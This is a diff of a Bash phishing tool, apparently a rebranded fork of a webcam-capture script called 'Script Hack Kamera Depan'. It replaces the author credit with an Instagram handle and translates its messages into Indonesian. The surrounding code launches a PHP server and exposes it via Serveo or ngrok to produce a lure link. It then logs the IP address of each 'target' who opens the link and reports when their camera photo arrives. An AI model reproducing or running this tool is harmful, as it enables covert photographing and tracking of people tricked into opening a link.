@@ -13,7 +13,7 @@ printf "\e[1;92m |   <| (_| | | | | | |  __/ | | (_| | \e[0m\e[1;77m \e[0m\n"
 printf "\e[1;92m |_|\_\ __ _|_| |_| |_|\___|_|  \__ _| \e[0m\e[1;77m \e[0m\n"
 printf "\e[1;92m             im hacker                 \e[0m\e[1;77m \e[0m\n"
 printf "\e[1;92m    [  Script Hack Kamera Depan  ]   \e[0m\n"   
-printf "\e[1;77m v1.0 coded by github.com/wisnusaputra123/selfie \e[0m\n"
+printf "\e[1;77m v1.0 Follow Instagram Saya wisnu_as123 \e[0m\n"
 
 printf "\n"
 
@@ -63,12 +63,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu Target Membuka Link,\e[0m\e[1;77m Tekan Ctrl + C Untuk Exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target Membuka Link kamu!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -77,7 +77,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto Telah Didapatkan!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -91,7 +91,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Memulai Serveo...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -107,7 +107,7 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Memulai php server... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
@@ -165,12 +165,12 @@ fi
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Memulai ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Link Anda Sudah Siap:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
@@ -219,7 +219,7 @@ start() {
 default_choose_sub="Y"
 default_subdomain="saycheese$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Buat Domain Sendiri? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
